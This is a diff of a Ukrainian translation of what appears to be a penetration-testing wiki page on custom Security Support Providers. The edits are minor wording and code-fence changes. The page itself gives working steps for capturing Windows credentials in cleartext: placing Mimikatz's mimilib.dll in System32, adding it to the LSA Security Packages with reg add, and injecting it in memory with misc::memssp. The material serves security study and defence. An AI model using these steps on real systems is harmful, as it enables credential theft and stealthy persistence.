@@ -5,11 +5,11 @@
 ### Custom SSP
 
 [Дізнайтеся, що таке SSP (Security Support Provider) тут.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
-Ви можете створити **свій власний SSP**, щоб **захоплювати** **в чистому тексті** **облікові дані**, які використовуються для доступу до машини.
+Ви можете створити **свій власний SSP**, щоб **захоплювати** **в чистому вигляді** **облікові дані**, які використовуються для доступу до машини.
 
 #### Mimilib
 
-Ви можете використовувати бінарний файл `mimilib.dll`, наданий Mimikatz. **Це буде записувати в файл всі облікові дані в чистому тексті.**\
+Ви можете використовувати бінарний файл `mimilib.dll`, наданий Mimikatz. **Це буде записувати в файл всі облікові дані в чистому вигляді.**\
 Скиньте dll у `C:\Windows\System32\`\
 Отримайте список існуючих LSA Security Packages:
 ```bash:attacker@target
@@ -19,7 +19,7 @@ HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
 Додайте `mimilib.dll` до списку постачальників підтримки безпеки (Security Packages):
-```powershell
+```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
 І після перезавантаження всі облікові дані можна знайти у відкритому вигляді в `C:\Windows\System32\kiwissp.log`
@@ -27,11 +27,11 @@ reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 #### У пам'яті
 
 Ви також можете безпосередньо впровадити це в пам'ять, використовуючи Mimikatz (зверніть увагу, що це може бути трохи нестабільно/не працювати):
-```powershell
+```bash
 privilege::debug
 misc::memssp
 ```
-Це не витримає перезавантаження.
+Це не переживе перезавантаження.
 
 #### Пом'якшення
 
